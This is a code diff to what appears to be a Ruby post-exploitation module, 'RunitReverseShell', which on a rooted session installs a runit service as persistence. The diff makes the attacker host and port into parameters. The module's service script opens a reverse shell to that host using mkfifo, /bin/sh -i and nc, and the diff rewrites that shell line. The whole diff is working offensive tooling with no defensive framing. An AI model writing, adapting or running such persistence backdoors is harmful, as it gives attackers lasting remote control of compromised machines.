@@ -1,5 +1,5 @@
 module RunitReverseShell
-  def self.run(fm, sid, client)
+  def self.run(fm, sid, client,lhost,lport)
     session = fm.sessions[sid]
     return unless session
 
@@ -21,9 +21,6 @@ module RunitReverseShell
 
     client.print_good("Session #{sid} is root. Deploying runit reverse shell...")
 
-    attacker_ip   = session.shell_command_token("hostname -I | awk '{print $1}'").strip
-    attacker_port = 4444
-
     # Evitar duplicação
     if session.shell_command_token("test -L #{service_link} || test -d #{svc_dir} && echo 'EXISTS'").include?('EXISTS')
       client.print_status("runit service already exists. Skipping.")
@@ -36,7 +33,7 @@ module RunitReverseShell
       exec 2>&1
       rm -f /tmp/.r
       mkfifo /tmp/.r
-      exec /bin/sh -i < /tmp/.r 2>&1 | nc #{attacker_ip} #{attacker_port} > /tmp/.r
+      exec /bin/sh -i < /tmp/.r 2>&1 | nc #{lhost} #{lport} > /tmp/.r
     RUN
 
     # Comando completo para configurar o serviço
